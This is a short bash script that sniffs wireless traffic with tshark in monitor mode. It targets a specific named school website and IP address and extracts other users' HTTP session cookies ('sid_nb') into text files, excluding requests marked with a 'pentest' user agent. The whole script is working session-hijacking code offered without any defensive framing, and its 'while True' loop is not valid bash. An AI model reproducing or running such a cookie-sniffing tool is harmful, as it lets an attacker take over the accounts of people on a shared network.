#! /bin/bash
while True;
	do
	clear
	if ping -o www.alevel.com.cn; then
		gtimeout 10 tshark -I -i en0 -f 'dst host 210.22.15.252' -Y "(http.cookie_pair contains sid_nb) && !(http.user_agent == "pentest")" -Tfields -e 'http.cookie_pair' > raw_cookies.txt 
		cat raw_cookies.txt | uniq >> less_cookies.txt
	fi
done
